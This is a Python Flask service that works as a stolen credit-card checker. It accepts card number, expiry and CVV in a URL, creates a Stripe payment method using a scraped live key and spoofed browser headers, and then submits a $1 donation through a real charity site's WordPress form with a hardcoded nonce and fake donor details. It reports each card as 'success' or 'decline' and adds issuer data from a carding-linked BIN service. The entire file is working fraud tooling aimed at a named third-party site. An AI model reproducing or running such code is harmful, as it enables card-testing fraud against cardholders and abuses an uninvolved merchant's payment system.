from flask import Flask, request, jsonify
import requests
import re
import time

app = Flask(__name__)

def validate_credit_card(card_data):
    """
    Validate credit card data format
    Expected format: card_no|mm|yy|cvv
    """
    if not card_data:
        return False, "No card data provided"
    
    parts = card_data.split('|')
    if len(parts) != 4:
        return False, "Invalid format. Use: card_no|mm|yy|cvv"
    
    card_no, mm, yy, cvv = parts
    
    # Validate card number (basic check)
    if not re.match(r'^\d{13,19}$', card_no):
        return False, "Invalid card number"
    
    # Validate month
    if not re.match(r'^\d{1,2}$', mm) or not (1 <= int(mm) <= 12):
        return False, "Invalid month (01-12)"
    
    # Validate year (accept both yy and yyyy)
    if not re.match(r'^\d{2,4}$', yy):
        return False, "Invalid year"
    
    # Convert year to 2-digit format if needed
    if len(yy) == 4:
        yy = yy[2:]
    
    # Validate CVV
    if not re.match(r'^\d{3,4}$', cvv):
        return False, "Invalid CVV"
    
    return True, {
        'card_no': card_no,
        'mm': mm.zfill(2),  # Ensure 2-digit month
        'yy': yy,
        'cvv': cvv,
        'bin': card_no[:6]  # Extract first 6 digits as BIN
    }

def get_bin_info(bin_num):
    """Get BIN information from antipublic API"""
    try:
        response = requests.get(f'https://bins.antipublic.cc/bins/{bin_num}', timeout=5)
        if response.status_code == 200:
            bin_data = response.json()
            # Format the response to get required fields
            formatted_bin_info = {
                'bin': bin_data.get('bin', bin_num),
                'brand': bin_data.get('brand', 'unknown'),
                'type': bin_data.get('type', 'unknown'),
                'category': bin_data.get('category', 'unknown'),
                'issuer': bin_data.get('issuer', 'unknown'),
                'alpha_2': bin_data.get('alpha_2', 'unknown'),
                'alpha_3': bin_data.get('alpha_3', 'unknown'),
                'country': bin_data.get('country', 'unknown'),
                'latitude': bin_data.get('latitude', 'unknown'),
                'longitude': bin_data.get('longitude', 'unknown'),
                'bank_phone': bin_data.get('bank_phone', 'unknown'),
                'bank_url': bin_data.get('bank_url', 'unknown')
            }
            return formatted_bin_info
        else:
            return {
                'bin': bin_num,
                'brand': 'unknown',
                'type': 'unknown',
                'category': 'unknown',
                'issuer': 'unknown',
                'country': 'unknown',
                'error': f"BIN API error: {response.status_code}"
            }
    except Exception as e:
        return {
            'bin': bin_num,
            'brand': 'unknown',
            'type': 'unknown',
            'category': 'unknown',
            'issuer': 'unknown',
            'country': 'unknown',
            'error': f"BIN API failed: {str(e)}"
        }

@app.route('/gateway=allcoughauth/cc=<path:card_data>', methods=['GET'])
def process_allcough_payment(card_data):
    """
    Process Stripe payment for allcoughedup.com
    Format: /gateway=allcoughauth/cc=card_no|mm|yy|cvv
    """
    start_time = time.time()
    
    try:
        # Validate card data
        is_valid, validation_result = validate_credit_card(card_data)
        
        if not is_valid:
            return jsonify({
                'status': 'decline',
                'message': validation_result,
                'response_time': round(time.time() - start_time, 2),
                'card_info': {
                    'bin': validation_result.get('bin', 'unknown') if isinstance(validation_result, dict) else 'unknown',
                    'last4': 'xxxx'
                }
            }), 200
        
        cc_data = validation_result
        
        # Step 1: Create Payment Method with Stripe
        stripe_headers = {
            'accept': 'application/json',
            'accept-language': 'en-US',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
        }

        stripe_data = f'type=card&card[number]={cc_data["card_no"]}&card[cvc]={cc_data["cvv"]}&card[exp_year]={cc_data["yy"]}&card[exp_month]={cc_data["mm"]}&guid=96cf39f6-3cee-4008-ba82-c50e9f1d144060102f&muid=6e11bc4f-eec3-4ddb-b37f-3201b860b6a5f0a007&sid=117e68ba-b49c-4e57-a34c-42ce67a2e90ef8059d&payment_user_agent=stripe.js%2F384cf3d9a5%3B+stripe-js-v3%2F384cf3d9a5%3B+card-element&referrer=https%3A%2F%2Fallcoughedup.com&time_on_page=142557&client_attribution_metadata[client_session_id]=795ed59f-9e82-4971-af19-3cde3b9fa266&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51PvhEE07g9MK9dNZrYzbLv9pilyugsIQn0DocUZSpBWIIqUmbYavpiAj1iENvS7txtMT2gBnWVNvKk2FHul4yg1200ooq8sVnV'

        print(f"[DEBUG] Sending request to Stripe API...")
        response1 = requests.post('https://api.stripe.com/v1/payment_methods', 
                                 headers=stripe_headers, 
                                 data=stripe_data, 
                                 timeout=15)
        
        stripe_response_time = round(time.time() - start_time, 2)
        print(f"[DEBUG] Stripe Response Status: {response1.status_code}")
        
        if response1.status_code != 200:
            stripe_error = "unknown"
            stripe_message = "unknown"
            try:
                error_json = response1.json()
                stripe_error = error_json.get('error', {}).get('code', 'unknown')
                stripe_message = error_json.get('error', {}).get('message', 'unknown')
                print(f"[DEBUG] Stripe Error: {stripe_error} - {stripe_message}")
            except:
                pass
            
            # Get BIN information even if stripe fails
            bin_info = get_bin_info(cc_data['bin'])
            
            return jsonify({
                'status': 'decline',
                'message': f'Stripe API error: {stripe_message}',
                'response_time': stripe_response_time,
                'card_info': {
                    'bin': cc_data['bin'],
                    'last4': cc_data['card_no'][-4:],
                    'brand': bin_info.get('brand', 'unknown'),
                    'type': bin_info.get('type', 'unknown'),
                    'issuer': bin_info.get('issuer', 'unknown'),
                    'country': bin_info.get('country', 'unknown'),
                    'category': bin_info.get('category', 'unknown')
                }
            }), 200
        
        stripe_op = response1.json()
        
        if 'id' not in stripe_op:
            print(f"[DEBUG] No 'id' found in Stripe response")
            bin_info = get_bin_info(cc_data['bin'])
            
            return jsonify({
                'status': 'decline',
                'message': 'Payment method creation failed',
                'response_time': stripe_response_time,
                'card_info': {
                    'bin': cc_data['bin'],
                    'last4': cc_data['card_no'][-4:],
                    'brand': bin_info.get('brand', 'unknown'),
                    'type': bin_info.get('type', 'unknown'),
                    'issuer': bin_info.get('issuer', 'unknown'),
                    'country': bin_info.get('country', 'unknown'),
                    'category': bin_info.get('category', 'unknown')
                }
            }), 200
            
        payment_method_id = stripe_op["id"]
        print(f"[DEBUG] Payment Method ID created: {payment_method_id}")
        
        # Step 2: Submit form to allcoughedup.com with Payment Method ID
        cookies = {
            '__stripe_mid': '6e11bc4f-eec3-4ddb-b37f-3201b860b6a5f0a007',
            '__stripe_sid': '117e68ba-b49c-4e57-a34c-42ce67a2e90ef8059d',
        }

        headers2 = {
            'accept': '*/*',
            'accept-language': 'en-US',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://allcoughedup.com',
            'referer': 'https://allcoughedup.com/registry/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }

        # Generate current timestamp for the 't' parameter
        current_timestamp = str(int(time.time() * 1000))
        params = {
            't': current_timestamp,
        }

        # Form data with user details and payment method
        form_data = {
            'data': f'__fluent_form_embded_post_id=3612&_fluentform_4_fluentformnonce=fe47369993&_wp_http_referer=%2Fregistry%2F&names%5Bfirst_name%5D=Raju&email=kingbossagainnn%40gmail.com&custom-payment-amount=1&description=&payment_method=stripe&__entry_intermediate_hash=50fffe01a27316b57c8fe0503cc885cc&__stripe_payment_method_id={payment_method_id}',
            'action': 'fluentform_submit',
            'form_id': '4',
        }
        
        print(f"[DEBUG] Sending donation form to allcoughedup.com...")
        
        response2 = requests.post(
            'https://allcoughedup.com/wp-admin/admin-ajax.php',
            params=params,
            cookies=cookies,
            headers=headers2,
            data=form_data,
            timeout=20
        )

        site_response_time = round(time.time() - start_time, 2)
        print(f"[DEBUG] Site Response Status: {response2.status_code}")

        # Get BIN information
        bin_info = get_bin_info(cc_data['bin'])
        
        # Check if the response indicates success
        try:
            response_json = response2.json()
            print(f"[DEBUG] Parsed JSON response")
            
            # Check different possible success indicators
            success = False
            error_message = "Payment failed"
            
            if response_json.get('success') == True:
                success = True
                error_message = response_json.get('message', 'Payment successful')
            elif response_json.get('result') == 'success':
                success = True
                error_message = response_json.get('message', 'Payment successful')
            elif response_json.get('status') == 'success':
                success = True
                error_message = response_json.get('message', 'Payment successful')
            
            if success:
                return jsonify({
                    'status': 'success',
                    'message': error_message,
                    'response_time': site_response_time,
                    'card_info': {
                        'bin': cc_data['bin'],
                        'last4': cc_data['card_no'][-4:],
                        'brand': bin_info.get('brand', 'unknown'),
                        'type': bin_info.get('type', 'unknown'),
                        'issuer': bin_info.get('issuer', 'unknown'),
                        'country': bin_info.get('country', 'unknown'),
                        'category': bin_info.get('category', 'unknown')
                    }
                }), 200
            else:
                # Extract error message from response
                error_msg = "Payment failed"
                if 'errors' in response_json:
                    error_msg = response_json['errors']
                elif 'message' in response_json:
                    error_msg = response_json['message']
                elif 'error' in response_json:
                    error_msg = response_json['error']
                
                return jsonify({
                    'status': 'decline',
                    'message': error_msg,
                    'response_time': site_response_time,
                    'card_info': {
                        'bin': cc_data['bin'],
                        'last4': cc_data['card_no'][-4:],
                        'brand': bin_info.get('brand', 'unknown'),
                        'type': bin_info.get('type', 'unknown'),
                        'issuer': bin_info.get('issuer', 'unknown'),
                        'country': bin_info.get('country', 'unknown'),
                        'category': bin_info.get('category', 'unknown')
                    }
                }), 200
                
        except Exception as e:
            print(f"[DEBUG] JSON parsing error: {str(e)}")
            
            # Check if there's HTML response with success message
            if "success" in response2.text.lower() or "thank" in response2.text.lower():
                return jsonify({
                    'status': 'success',
                    'message': 'Payment appears successful',
                    'response_time': site_response_time,
                    'card_info': {
                        'bin': cc_data['bin'],
                        'last4': cc_data['card_no'][-4:],
                        'brand': bin_info.get('brand', 'unknown'),
                        'type': bin_info.get('type', 'unknown'),
                        'issuer': bin_info.get('issuer', 'unknown'),
                        'country': bin_info.get('country', 'unknown'),
                        'category': bin_info.get('category', 'unknown')
                    }
                }), 200
            else:
                return jsonify({
                    'status': 'decline',
                    'message': 'Payment failed - Invalid response from site',
                    'response_time': site_response_time,
                    'card_info': {
                        'bin': cc_data['bin'],
                        'last4': cc_data['card_no'][-4:],
                        'brand': bin_info.get('brand', 'unknown'),
                        'type': bin_info.get('type', 'unknown'),
                        'issuer': bin_info.get('issuer', 'unknown'),
                        'country': bin_info.get('country', 'unknown'),
                        'category': bin_info.get('category', 'unknown')
                    }
                }), 200

    except requests.exceptions.Timeout as timeout_err:
        print(f"[DEBUG] Timeout error: {str(timeout_err)}")
        response_time = round(time.time() - start_time, 2)
        
        # Get BIN info even on timeout
        bin_info = {}
        if 'cc_data' in locals():
            bin_info = get_bin_info(cc_data['bin'])
        
        return jsonify({
            'status': 'decline',
            'message': f'Request timeout: {str(timeout_err)}',
            'response_time': response_time,
            'card_info': {
                'bin': cc_data['bin'] if 'cc_data' in locals() else 'unknown',
                'last4': cc_data['card_no'][-4:] if 'cc_data' in locals() else 'xxxx',
                'brand': bin_info.get('brand', 'unknown'),
                'type': bin_info.get('type', 'unknown'),
                'issuer': bin_info.get('issuer', 'unknown'),
                'country': bin_info.get('country', 'unknown'),
                'category': bin_info.get('category', 'unknown')
            }
        }), 200
        
    except requests.exceptions.RequestException as req_err:
        print(f"[DEBUG] Request error: {str(req_err)}")
        response_time = round(time.time() - start_time, 2)
        
        # Get BIN info
        bin_info = {}
        if 'cc_data' in locals():
            bin_info = get_bin_info(cc_data['bin'])
        
        return jsonify({
            'status': 'decline',
            'message': f'Network error: {str(req_err)}',
            'response_time': response_time,
            'card_info': {
                'bin': cc_data['bin'] if 'cc_data' in locals() else 'unknown',
                'last4': cc_data['card_no'][-4:] if 'cc_data' in locals() else 'xxxx',
                'brand': bin_info.get('brand', 'unknown'),
                'type': bin_info.get('type', 'unknown'),
                'issuer': bin_info.get('issuer', 'unknown'),
                'country': bin_info.get('country', 'unknown'),
                'category': bin_info.get('category', 'unknown')
            }
        }), 200
        
    except Exception as e:
        print(f"[DEBUG] General error: {str(e)}")
        import traceback
        traceback.print_exc()
        response_time = round(time.time() - start_time, 2)
        
        # Get BIN info even on error
        bin_info = {}
        if 'cc_data' in locals():
            bin_info = get_bin_info(cc_data['bin'])
        
        return jsonify({
            'status': 'decline',
            'message': f'Internal error: {str(e)}',
            'response_time': response_time,
            'card_info': {
                'bin': cc_data['bin'] if 'cc_data' in locals() else 'unknown',
                'last4': cc_data['card_no'][-4:] if 'cc_data' in locals() else 'xxxx',
                'brand': bin_info.get('brand', 'unknown'),
                'type': bin_info.get('type', 'unknown'),
                'issuer': bin_info.get('issuer', 'unknown'),
                'country': bin_info.get('country', 'unknown'),
                'category': bin_info.get('category', 'unknown')
            }
        }), 200

@app.route('/test_connection', methods=['GET'])
def test_connection():
    """Test connection to allcoughedup.com"""
    try:
        response = requests.get('https://allcoughedup.com/registry/', timeout=10)
        return jsonify({
            'status': 'success',
            'site_status': response.status_code,
            'message': f'Connection successful to allcoughedup.com'
        }), 200
    except Exception as e:
        return jsonify({
            'status': 'error',
            'message': f'Connection failed: {str(e)}'
        }), 200

@app.route('/bin_lookup/<bin_num>', methods=['GET'])
def bin_lookup(bin_num):
    """Look up BIN information directly"""
    bin_info = get_bin_info(bin_num)
    return jsonify({
        'status': 'success',
        'bin_info': bin_info
    }), 200

@app.route('/health', methods=['GET'])
def health_check():
    """Health check endpoint"""
    return jsonify({
        'status': 'healthy',
        'timestamp': time.time(),
        'service': 'AllCoughedUp Payment Processor v2.0'
    }), 200

@app.route('/', methods=['GET'])
def home():
    """Home endpoint with usage instructions"""
    return jsonify({
        'message': 'AllCoughedUp Payment Processor API',
        'version': '2.0',
        'usage': 'GET /gateway=allcoughauth/cc=card_no|mm|yy|cvv',
        'example': '/gateway=allcoughauth/cc=4037660055456859|03|27|541',
        'endpoints': [
            '/gateway=allcoughauth/cc={card_data} - Process payment',
            '/bin_lookup/{bin} - Check BIN information',
            '/test_connection - Test site connection',
            '/health - Health check'
        ],
        'response_format': {
            'status': 'success/decline',
            'message': 'Payment status message',
            'response_time': 'Time in seconds',
            'card_info': {
                'bin': 'First 6 digits',
                'last4': 'Last 4 digits',
                'brand': 'Card brand',
                'type': 'Card type',
                'issuer': 'Bank/issuer',
                'country': 'Country',
                'category': 'Card category'
            }
        }
    }), 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5001, debug=True)